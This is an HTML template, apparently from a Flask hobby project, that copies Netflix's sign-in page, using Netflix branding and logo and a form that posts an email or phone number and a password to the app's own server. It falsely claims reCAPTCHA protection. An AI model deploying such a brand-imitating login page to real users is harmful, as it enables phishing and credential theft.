<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Netflix WELCOME Page</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
</head>
<body>
  <!-- Netflix Opening "N" Zoom Animation Screen -->
  <!-- Cinematic Netflix Official "N" Screen -->
  <div class="intro-screen">
    <div class="netflix-logo-box">
      <svg class="netflix-n-svg" viewBox="0 0 111 160" fill="none" xmlns="http://www.w3.org/2000/svg">
        <!-- Left vertical bar (dark shade) -->
        <path d="M0 0H33.8V160H0V0Z" fill="#B81D24"/>
        <!-- Right vertical bar (dark shade) -->
        <path d="M77.2 0H111V160H77.2V0Z" fill="#B81D24"/>
        <!-- Center Diagonal bar with 3D drop-shadow (bright red) -->
        <path d="M0 0H33.8L111 160H77.2L0 0Z" fill="#E50914" filter="url(#drop-shadow)"/>
        
        <defs>
          <filter id="drop-shadow" x="-30%" y="-30%" width="160%" height="160%">
            <feDropShadow dx="-4" dy="0" stdDeviation="6" flood-color="#000000" flood-opacity="0.85"/>
          </filter>
        </defs>
      </svg>
    </div>
  </div>

  <nav>
    <a href="#">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
    </a>
  </nav>

  <div class="background-image"></div>

  <div class="form-wrapper">
    <h1>hi this is Purna</h1>
    <h2>NETFLIX SIGN IN V-2.7</h2>
    <form action="/" method="POST">
      <div class="form-control">
        <input type="text" name="mobile" id="mobile" required placeholder=" " />
        <label for="mobile">Mobile number or email</label>
      </div>
      <div class="form-control">
        <input type="password" name="password" id="password" required placeholder=" " />
        <label for="password">Password</label>
      </div>
      <button type="submit">WELCOME TO NETFLIX V-5.0</button>
      
      <div class="form-help">
        <div class="remember-me">
          <input type="checkbox" name="remember" id="remember-me" checked />
          <label for="remember-me">Remember me</label>
        </div>
        <a href="#">Need help?</a>
      </div>
    </form>

    <p>New to Netflix? <a href="#">Lets join up now</a></p>
    <small>
      This page is protected by Google reCAPTCHA to ensure you're not a bot.
      <a href="#">Learn more.</a>
    </small>
  </div>
</body>
</html>
